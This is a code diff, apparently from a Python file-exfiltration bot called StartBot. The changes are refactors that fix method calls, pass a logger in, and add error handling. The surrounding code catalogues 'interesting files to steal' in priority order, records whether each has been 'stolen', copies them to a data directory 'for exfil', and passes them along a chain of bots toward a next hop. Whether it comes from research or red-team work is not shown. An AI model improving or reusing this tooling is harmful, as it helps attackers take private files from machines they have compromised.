@@ -113,10 +113,10 @@ class StartBot(object):
             conn.commit()
             c.close()
         except Exception as e:
-            logger.critical('ERROR: Unable to create file table: %s', e)
+            self.logger.critical('ERROR: Unable to create file table: %s', e)
             sys.exit(1)
 
-    def steal_a_file(self, conn, my_ip):
+    def steal_a_file(self, conn, my_ip, logger):
         '''Get the highest priority "unstolen" file in the files table and copy it to the datadir'''
         c = conn.cursor()
         # First get the name of the file
@@ -127,7 +127,10 @@ class StartBot(object):
         conn.commit()
         c.close()
         # Finally, transfer the file to the data_dir for exfil
-        shutil.copyfile(file[0], StartBot.data_dir + '/' + my_ip.replace('.', '-') + file[0].replace('/','_'))
+        try:
+            shutil.copyfile(file[0], StartBot.data_dir + '/' + my_ip.replace('.', '-') + file[0].replace('/','_'))
+        except Exception as e:
+            logger.warning('ERROR: Unable to copy file {}: {}'.format(file[0], repr(e)))
 
     def store_file_info(self, conn, filelst):
         '''Store the data from the file list in a local SQLite3 database'''
@@ -287,7 +290,7 @@ class StartBot(object):
                     logger.critical('XMLRPC client at source unable to create data directory: %s', e)
                     sys.exit(1)
             # Create the table for files
-            create_file_db(conn)
+            self.create_file_db(conn)
             # Populate a list of files for exfil
             filelst = []
             priority = 1
@@ -296,7 +299,7 @@ class StartBot(object):
             # This loop creates a list, along with the last-modified
             # time for each, as well as default values for their
             # priority and whether they've already been "stolen"
-            for file in myfiles:
+            for file in StartBot.myfiles:
                 try:
                     mtime = time.ctime(os.path.getmtime(file))
                     mtime = time.strftime('%Y-%m-%d %H:%M:%S', time.strptime(mtime, "%a %b %d %H:%M:%S %Y"))
@@ -306,7 +309,7 @@ class StartBot(object):
             # mydirs is a list of directories containing interesting
             # files to steal. They're listed in priority order, from
             # highest to lowest
-            for dir in mydirs:
+            for dir in StartBot.mydirs:
                 priority += 1
                 for root, dirs, files in os.walk(dir, topdown=True):
                     for name in files:
@@ -319,7 +322,7 @@ class StartBot(object):
                             pass
             # Store the file list in the local database
             logger.info('Building data table on files to steal')
-            store_file_info(conn, filelst)
+            self.store_file_info(conn, filelst)
             logger.info('All file data successfully stored')
         # Now, who is our next hop? We need this to define which server
         # to connect our client to, if any...
@@ -361,7 +364,7 @@ class StartBot(object):
                 # Check to see whether any new files have come our way since the last
                 # loop iteration.
                 if my_seq_no == 0:
-                    steal_a_file(conn, my_ip)
+                    self.steal_a_file(conn, my_ip, logger)
                 files = os.listdir(StartBot.data_dir)
                 logger.info('Files in the data directory: %s', files)
                 # For those bots that have clients, we need to send these files to the
